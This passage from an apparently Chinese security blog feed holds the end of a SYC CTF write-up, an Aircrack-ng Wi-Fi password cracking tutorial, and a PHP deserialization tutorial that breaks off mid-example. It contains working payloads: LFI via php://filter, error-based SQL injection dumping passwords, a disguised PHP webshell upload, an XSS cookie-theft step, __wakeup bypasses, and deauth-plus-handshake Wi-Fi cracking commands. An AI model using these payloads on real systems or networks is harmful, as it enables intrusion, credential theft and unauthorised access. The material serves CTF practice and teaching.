class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload：</p><pre><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></pre><p>base64解密发现flag</p><pre><code>Syc&#123;Jiang_1uYuan_No_I&#125;</code></pre><h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><p>这题用的是报错注入，<code>union|or|and|substr|if|hex|mid|char|</code>等等都进行 了过滤，这里只能用报错注入<br><strong>爆数据库</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117205229.png"></p><p><strong>爆表</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like&#39;geek&#39;),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117210116.png"></p><p><strong>爆字段</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like&#39;H4rDsq1&#39;),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117211051.png"></p><p><strong>爆内容</strong></p><pre><code>?username=admin&amp;password=admin&#39;^updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1)),0x7e),1)%23</code></pre><p><img src="/2019/11/06/syc-ctf-wp/20191117211308.png"></p><p>在buu上flag的长度太长，我们可以用reverse函数</p><img src="/2019/11/06/syc-ctf-wp/TIM截图20200516170018.png" style="zoom:80%;"><h2 id="你有特洛伊么"><a href="#你有特洛伊么" class="headerlink" title="你有特洛伊么"></a>你有特洛伊么</h2><p>给了个base64加密的东西，解密发现是<code>this is not easy</code>，好像没啥用</p><p>打开网址，发现可以上传文件，试着上传，发现对文件头做了检测，并且对<code>&lt;?</code>过滤</p><p>发现.phtml没有过滤，所以就上传一句话</p><pre><code>GIF89a&lt;script language=&#39;php&#39;&gt;@eval($_POST[&#39;shell&#39;]);&lt;/script&gt;</code></pre><p>抓包前为<code>.gif</code>格式，抓包后改成<code>.phtml</code></p><p>蚁剑连，得到flag</p><pre><code>Syc&#123;Upl0ad_f1l3_i5_daNger0us&#125;</code></pre><h2 id="Leixiao’s-blog"><a href="#Leixiao’s-blog" class="headerlink" title="Leixiao’s blog"></a>Leixiao’s blog</h2><p>提示用XSS，但是写在博客里的东西只有自己账号可以看到，所以就去其他找XSS</p><p>发现注册时的密保问题是可控的，抓包修改即可，发现是限制长度的为32位</p><p><img src="/2019/11/06/syc-ctf-wp/20191115214608.png"></p><p>并没有弹窗</p><p><img src="/2019/11/06/syc-ctf-wp/20191115215210.png"></p><p>查看源代码</p><p><img src="/2019/11/06/syc-ctf-wp/20191115215314.png"></p><p>所以闭合标签的payload</p><pre><code>&quot;&gt;&lt;script src=***&gt;</code></pre><p>在***里填入盗cookie的代码</p><p>登陆xss平台</p><p><img src="/2019/11/06/syc-ctf-wp/20191115215947.png"></p><p>bp抓包改下question</p><p><img src="/2019/11/06/syc-ctf-wp/20191115220224.png"></p><p>然后把链接发给管理员</p><p><img src="/2019/11/06/syc-ctf-wp/20191115220539.png"></p><p>在xss平台可以看到就可以得到flag了</p><h2 id="反序列化1-0"><a href="#反序列化1-0" class="headerlink" title="反序列化1.0"></a>反序列化1.0</h2><p>这题就是考察对反序列化的基本认识</p><p>查看源代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Student</span><br><span class="line">&#123;</span><br><span class="line">    public $score &#x3D; 0;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;__destruct working&quot;;</span><br><span class="line">        if($this-&gt;score&#x3D;&#x3D;10000) &#123;</span><br><span class="line">            $flag &#x3D; &quot;******************&quot;;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp &#x3D; $_GET[&#39;exp&#39;];</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>只需将<code>$score=10000</code>就行,</p><p>payload:</p><pre><code>?exp=O:7:&quot;Student&quot;:1:&#123;s:5:&quot;score&quot;;i:10000;&#125;Syc&#123;F4n-Xu-L4i-Hu4-Ha-Ha-Ha&#125;</code></pre><h2 id="又来一只猫"><a href="#又来一只猫" class="headerlink" title="又来一只猫"></a>又来一只猫</h2><p>dirsearch扫一下发现<code>www.zip</code>文件，发现好像是网站之前的源码</p><p>从<code>index.php</code>可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &#39;class.php&#39;;</span><br><span class="line">$select &#x3D; $_GET[&#39;select&#39;];</span><br><span class="line">$res&#x3D;unserialize(@$select);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从<code>class.php</code>可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这题就变成了绕过<code>__wakeup</code>方法</p><p>payload：</p><pre><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;Syc&#123;H31lo_4dmiN_r3al_f14g&#125;</code></pre><h2 id="你有初恋吗"><a href="#你有初恋吗" class="headerlink" title="你有初恋吗"></a>你有初恋吗</h2><p>查看源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$adore&#x3D;&#39;***************&#39;;</span><br><span class="line">$now &#x3D; $_POST[&#39;lover&#39;];</span><br><span class="line">setcookie(&quot;Heart&quot;, md5($adore.&#39;syclover&#39;));</span><br><span class="line">if(isset($now)&amp;&amp;$now!&#x3D;syclover) &#123;</span><br><span class="line">if($_COOKIE[&#39;Heart&#39;] &#x3D;&#x3D;&#x3D; md5($adore. urldecode($now)))&#123;</span><br><span class="line">die ($flag);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">die(&#39;I do not love you! You are not in my heart!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>这里用url二次编码就行</p><p>直接用hackbar POST</p><pre><code>lover=%2573%2579%2563%256c%256f%2576%2565%2572Syc&#123;D0_Y0u_l0v3_M3???&#125;</code></pre><h2 id="ﬁnalsql"><a href="#ﬁnalsql" class="headerlink" title="ﬁnalsql"></a>ﬁnalsql</h2><p>这道题登陆框的注入已经被过滤的干干净净，不过在神秘代码处可以进行异或盲注</p><p>空格，*以及所有mysql里可以代替空格的不可显字符，但是没有禁用括号</p><p>禁用了or或and与=连用，所以or 1=(payload)形式不好用了，这里可以用异或注入（当然其它运算符都可以），脚本如下</p><p><img src="/2019/11/06/syc-ctf-wp/20191117212655.png"></p><p>二分法脚本：</p><p><img src="/2019/11/06/syc-ctf-wp/20191117212626.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
            <tag> SYC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Aircrack-ng学习使用</title>
      <link href="2019/11/02/aircrack-wifi/"/>
      <url>2019/11/02/aircrack-wifi/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了Aircrack-ng的使用，以及用此工具破解wifi的教程！</p><a id="more"></a><h2 id="Aircrack-ng是什么？"><a href="#Aircrack-ng是什么？" class="headerlink" title="Aircrack-ng是什么？"></a>Aircrack-ng是什么？</h2><p>Aircrack-ng是一个与802.11标准的无线网络分析有关的安全套件。</p><p><strong>主要功能：</strong>网络侦测，数据包嗅探，WEP和WPA/WPA2-PSK破解。</p><p>Aircrack-ng可以工作在任何支持监听模式的无线网卡上（设备列表请参阅其官方网站）并嗅探802.11a，802.11b，802.11g的数据</p><p>aircrack-ng 套件包含有：</p><p><img src="/2019/11/02/aircrack-wifi/20191102181301.png"></p><h2 id="实战破解wifi"><a href="#实战破解wifi" class="headerlink" title="实战破解wifi"></a>实战破解wifi</h2><p>分为五个阶段：</p><ol><li>准备</li><li>探测</li><li>抓包</li><li>攻击</li><li>破解</li></ol><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>硬件方面：</p><ol><li>无线网卡</li><li>kali虚拟机（或者装有Aircrack-ng套件的windows)</li></ol><p>准备一个强大的字典</p><h3 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h3><p>开始时一定要保证它现在没有连接到任何wifi</p><p>下面那个wlan0里面没有ip地址什么的就说明现在不在连接中</p><p><img src="/2019/11/02/aircrack-wifi/20191102184437.png"></p><p>启用无线网卡至monitor即监听模式</p><pre><code>airmon-ng start wlan0</code></pre><p>如果再次使用ifconfig可以发现，我们的网卡已经被重命名为wlan0mon</p><p><img src="/2019/11/02/aircrack-wifi/20191102194926.png"></p><p>获取当前网络概况：</p><pre><code>airodump-ng wlan0mon</code></pre><h3 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h3><p><img src="/2019/11/02/aircrack-wifi/20191102195143.png"></p><p>探测无线网络，抓取无线数据包</p><pre><code>airodump-ng --bssid 目标mac地址 -c 11 -w longas wlan0mon </code></pre><p>参数解释：</p><ol><li>–bssid</li><li>-c设置目标AP的工作频道</li><li>-w后面紧跟要保存的文件的文件名，注意：生成的文件名是longas-01.cap</li><li>wlan0mon：为之前已经开启监听的网卡名</li></ol><p>按Enter开始执行，不要关闭并打开另一个shell进行下一步</p><p><img src="/2019/11/02/aircrack-wifi/20191102201113.png"></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>这里为了获得破解所需的WPA2握手验证的整个完整数据包，我们将会发送一种称之为“Deauth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，我们也就有机会捕获到包含WPA2握手验证的完整数据包了。<br>此处需要新开一个shell：</p><pre><code>aireplay-ng -0 1 –a 路由器mac -c 客户端mac wlan0mon</code></pre><p>参数解释：</p><ol><li>-0 采用deauth攻击模式，后面跟上攻击次数，这里我设置为1，大家可以根据实际情况设置为10不等</li><li>-a 后跟路由器的mac地址</li><li>-c 后跟客户端的mac地址，不指定的话会攻击所有的已连接的客户端，下图中STATION一栏代表的就是已连接的客户端</li></ol><p><img src="/2019/11/02/aircrack-wifi/20191102202202.png"></p><p>然后回到抓取数据包的界面。在右上角出现handshake的提示证明获得了包含WPA-PSK密码的握手数据报文。如未出现，请再次执行上述步骤</p><p><img src="/2019/11/02/aircrack-wifi/20191102202331.png"></p><h3 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h3><pre><code>aircrack-ng -w dict.txt 捕获的.cap文件</code></pre><p><img src="/2019/11/02/aircrack-wifi/20191102205849.png"></p><p>由于我这个密码设置的简单，回车立马出来了</p><p>参考：</p><p><a href="https://www.jianshu.com/p/fd16236057df">https://www.jianshu.com/p/fd16236057df</a><br><a href="https://chujian521.github.io/blog/2018/08/23/%E4%BD%BF%E7%94%A8Aircrack-ng%E8%BF%9B%E8%A1%8CWiFi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">https://chujian521.github.io/blog/2018/08/23/使用Aircrack-ng进行WiFi密码破解/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Aircrack-ng </tag>
            
            <tag> wifi破解 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php序列化和反序列化</title>
      <link href="2019/10/27/php-serialize/"/>
      <url>2019/10/27/php-serialize/</url>
      
        <content type="html"><![CDATA[<p>本篇博客介绍了php序列化和反序列化的相关知识！</p><a id="more"></a><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><p><strong>什么是序列化和反序列化？</strong></p><p>**序列化:**把复杂的数据类型压缩到一个字符串中，数据类型可以是数组，字符串，对象等 </p><p>**反序列化:**恢复原先被序列化的变量</p><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><pre><code>serialize()     //将一个对象转换成一个字符串unserialize()   //将字符串还原成一个对象</code></pre><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>例如下面一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    class test</span><br><span class="line">    &#123;</span><br><span class="line">        private $flag &#x3D; &quot;flag&#123;233&#125;&quot;;</span><br><span class="line">        public $a &#x3D; &quot;aaa&quot;;</span><br><span class="line">        static $b &#x3D; &quot;bbb&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $test &#x3D; new test;</span><br><span class="line">    $data &#x3D; serialize($test);</span><br><span class="line">    echo $data;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>看一下运行结果</p><p><img src="/2019/10/27/php-serialize/20191027202418.png"></p><pre><code>O:4:&quot;test&quot;:2:&#123;s:10:&quot; test flag&quot;;s:9:&quot;flag&#123;233&#125;&quot;;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;</code></pre><p>序列化的结果满足：</p><pre><code>O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</code></pre><p>这里说明一下序列化字符串的含义：</p><ol><li><p><code>O:4:&quot;test&quot;</code>指Object(对象) 4个字符:test</p></li><li><p><code>:2</code>对象属性个数为2</p></li><li><p><code>&#123;&#125;</code>中为属性字符数：属性值</p></li></ol><p><strong>注意：</strong>可以看到testflag的长度为8，序列化中却显示长度为10。这是因为它是private属性，翻阅文档就可以看到说明，它会在两侧加入空字节</p><p><code>\x00 + 类名 + \x00 + 变量名 </code>反序列化出来的是private变量, <code>\x00 + * + \x00 + 变量名 </code>反序列化出来的是protected变量 直接变量名反序列化出来的是public变量</p><p><img src="/2019/10/27/php-serialize/20191027202418.png"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>下面一段代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    $str &#x3D; &#39;O%3A4%3A%22test%22%3A2%3A%7Bs%3A10%3A%22%00test%00flag%22%3Bs%3A9%3A%22flag%7B233%7D%22%3Bs%3A1%3A%22a%22%3Bs%3A3%3A%22aaa%22%3B%7D&#39;;</span><br><span class="line">    $data &#x3D; urldecode($str);</span><br><span class="line">    $obj &#x3D; unserialize($data);</span><br><span class="line"></span><br><span class="line">    var_dump($obj);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/10/27/php-serialize/20191027210508.png"></p><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>PHP中把以两个下划线<code>__</code>开头的方法称为魔术方法(Magic methods)</p><p><img src="/2019/10/27/php-serialize/20191027210743.png"></p><p><strong>比较重要的几个函数：</strong></p><p><strong>__sleep()</strong></p><p><code>serialize()</code> 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 <code>E_NOTICE</code> 级别的错误。</p><p><strong>__wakeup()</strong></p><p><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</p><p><strong>__toString()</strong></p><p><code>__toString()</code> 方法用于一个类被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 <code>E_RECOVERABLE_ERROR</code> 级别的致命错误。</p><p><strong>__destruct()</strong></p><p>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</p><p><strong>__construct()</strong></p><p>造方法是对象创建完成后第一个被对象自动调用的方法。在每个类中都有一个构造方法，如果没有显示声明它，那么类中都会默认存在一个没有参数且内容为空的构造方法。通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。</p><h2 id="魔术方法执行流程"><a href="#魔术方法执行流程" class="headerlink" title="魔术方法执行流程"></a>魔术方法执行流程</h2><p><strong>举个例子：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test= <span class="keyword">new</span> Test();</span><br><span class="line">$sTest= serialize($test);</span><br><span class="line">$usTest= unserialize($sTest);</span><br><span class="line">$string= <span class="string">&#x27;hello class &#x27;</span> . $test;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>分析一下执行过程：</strong></p><p>new了一个对象，对象被创建，执行<code>__construct</code>方法</p><p>serialize了一个对象，对象被序列化，先执行<code>__sleep</code>方法，再序列化</p><p>unserialize了一个序列化字符串，对象被反序列化，先反序列化，再执行<code>__wakeup</code>方法</p><p>把Test这个对象当做字符串使用了，执行<code>__toString</code>方法</p><p>程序运行完毕，对象自动销毁，执行<code>__destruct</code>方法</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><p>这个漏洞主要是用于绕过<code>__wakeup()</code>方法的</p><p><strong>利用方式：</strong></p><p><strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p><p>例如：</p><p>构造序列化对象：</p><pre><code>O:5:&quot;SoFun&quot;:1:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><p>绕过__wakeup：</p><pre><code>O:5:&quot;SoFun&quot;:2:&#123;S:7:&quot;\00*\00file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></pre><p>这个\00在url传输时使用%00的</p><h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>PHP在session存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 <code>$_SESSION </code>数据，都会对数据进行序列化和反序列化</p><p>在php.ini中有以下关于session配置项(通过phpinfo)：</p><p><img src="/2019/10/27/php-serialize/20191031204827.png"></p><p><strong>有几个重要的配置：</strong></p><p><code>session.save_path</code> 设置session的存储路径</p><p><code>session.save_handler</code> 设定用户自定义存储函数</p><p><code>session.auto_start</code> 指定会话模块是否在请求开始时启动一个会话</p><p><code>session.serialize_handler</code> 定义用来序列化/反序列化的处理器名字。默认使用php<br>除了默认的session序列化引擎php外，还有几种引擎，不同引擎存储方式不同:</p><ol><li><strong>php_binary：</strong> 键名的长度对应的ASCII字符＋键名＋经过<code>serialize()</code> 函数反序列处理的值</li><li><strong>php：</strong> 键名＋竖线＋经过<code>serialize()</code>函数反序列处理的值</li><li><strong>php_serialize：</strong> <code>serialize()</code>函数反序列处理数组方式</li></ol><h4 id="存储机制"><a href="#存储机制" class="headerlink" title="存储机制"></a>存储机制</h4><p>php中的session内容是以文件方式来存储的，由<code>session.save_handler</code>来决定。文件名由<code>sess_+sessionid</code>命名，文件内容则为session序列化后的值。</p><p>而这个sessionid是可以在浏览器里查出来的<br><img src="/2019/10/27/php-serialize/20191031210527.png"></p><p>来测试一个demo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    $_SESSION[&#39;name&#39;] &#x3D; &#39;twosmi1e&#39;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行后在配置文件设定的路径中会生成一个session文件，其内容为</p><pre><code>a:1:&#123;s:4:&quot;name&quot;;s:8:&quot;twosmi1e&quot;;&#125;</code></pre><p>改变<code>session.save_handler</code>发现：</p><p>随着存储引擎变化，其内容的格式也会变化</p><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>通过上面对存储格式的分析，如果 PHP 在反序列化存储的 <code>$_SESSION</code> 数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的构造，甚至可以伪造任意数据：</p><pre><code>$_SESSION[&#39;ryat&#39;] = &#39;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#39;;</code></pre><p>例如上面的 <code>$_SESSION</code> 数据，在存储时使用的序列化处理器为 <code>php_serialize</code>，存储的格式如下：</p><pre><code>a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code></pre><p>在读取数据时如果用的反序列化处理器不是 <code>php_serialize</code>，而是 <code>php</code> 的话，那么反序列化后的数据将会变成：</p><pre><code>// var_dump($_SESSION);array(1) &#123;  [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt;  object(stdClass)#1 (0) &#123;  &#125;&#125;</code></pre><p>可以看到，通过注入 <code>|</code> 字符伪造了对象的序列化数据，成功实例化了 <code>stdClass</code> 对象</p><p>那么就存在两种情况：</p><p><strong>当 session.auto_start＝Off 时</strong></p><p>当配置选项 session.auto_start＝Off，存在两个脚本注册 Session 会话时使用的序列化处理器不同，就会出现安全问题，如下面的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;foo1.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;ryat&#39;] &#x3D; 